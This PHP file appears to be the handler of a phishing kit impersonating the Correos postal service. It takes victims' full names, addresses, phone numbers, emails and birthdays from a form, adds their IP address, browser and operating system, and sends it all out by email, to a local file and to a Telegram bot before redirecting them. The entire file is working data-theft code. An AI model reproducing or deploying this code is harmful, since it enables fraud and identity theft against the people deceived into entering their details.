<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../Conan/911.php');
include('../Conan/COUNTRY.php');
include('../Conan/SYS.php');
include('../Conan/TELEGRMAT.php');

$_SESSION['phone'] = $_POST['phone'];

if (isset($_POST['submit'])) {
    $message = "* +------+INFO-Argentina+------+\n";
    $message .= "* Fulll Naame : ".$_POST['fullname']."\n";
    $message .= "* Adddres : ".$_POST['address']."\n";
    $message .= "* Ciity : ".$_POST['City']."\n";
    $message .= "* zippostal : ".$_POST['zipcode']."\n";
    $message .= "* phooone : ".$_POST['phone']."\n";
    $message .= "* emaaail : ".$_POST['email']."\n";
    $message .= "* birrrthday : ".$_POST['birthday']."\n";

    $message .= "* +------+INFO+------+\n";
    $message .= "* Country: #$get_user_country\n";
    $message .= "* IP Address: $ip\n";
    $message .= "* Operating System: $user_os\n";
    $message .= "* Browser: $user_browser\n";
    $message .= "* Time: $date\n";
    $message .= "* +------++------+\n";

    $subject = "+------+INFO-CORREOS+------+";
    $headers = "From: INFO@CORREOS.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    mail($to, $subject, $message, $headers);

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../B.php?cred=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
    exit;
}
?>